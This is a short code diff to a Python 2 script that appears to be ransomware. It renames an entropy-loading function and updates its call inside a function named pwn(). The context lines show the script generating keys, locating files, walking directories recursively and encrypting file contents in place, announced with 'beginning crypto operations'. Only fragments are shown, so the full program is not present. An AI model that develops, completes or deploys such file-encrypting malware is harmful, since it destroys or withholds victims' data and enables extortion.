@@ -60,7 +60,7 @@ def encrypt(filepath, key):
                     chunk += b' ' * (16 - (len(chunk) % 16))
                 outfile.write(encryptor.encrypt(chunk))
 
-def load_entropy():
+def load_hue():
     print "Loading Source of HUE ..."
     source = os.urandom(256)
     for i in range(3):
@@ -121,7 +121,7 @@ def encrypt_dir(directory, key):
             encrypt_dir(path, key)
 
 def pwn():
-    keys = generate_keys(load_entropy())
+    keys = generate_keys(load_hue())
     dirs = locate_files()
     print "beginning crypto operations"
     for dir in sorted(dirs):
